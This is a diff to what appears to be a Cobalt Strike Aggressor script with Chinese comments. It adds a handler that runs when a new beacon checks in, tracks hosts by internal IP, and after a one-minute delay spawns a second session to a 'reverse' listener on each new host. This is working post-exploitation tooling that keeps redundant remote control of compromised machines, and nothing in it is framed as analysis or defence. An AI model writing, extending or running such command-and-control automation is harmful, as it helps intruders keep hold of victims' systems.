@@ -108,6 +108,30 @@ popup beacon_bottom {
     }
 }
 
+on beacon_initial {
+    local('$bid $internal');
+    $bid = $1;
+    
+    # 获取主机的内网IP作为唯一标识
+    $internal = beacon_info($bid, "internal");
+    
+    # 检查这个主机是否已经派生过
+    if (!-ishash %spawned_hosts) {
+        %spawned_hosts = %();
+    }
+    
+    if (%spawned_hosts[$internal] == $null) {
+        # 标记这个主机已经派生
+        %spawned_hosts[$internal] = 1;
+        
+        # 延迟1分钟后执行spawn
+        fork({
+            sleep(60000);
+            bspawn($bid, "reverse");
+        }, \$bid);
+    }
+}
+
 popup beacon_top {
     item "Bind连接" {
         local('$bid');
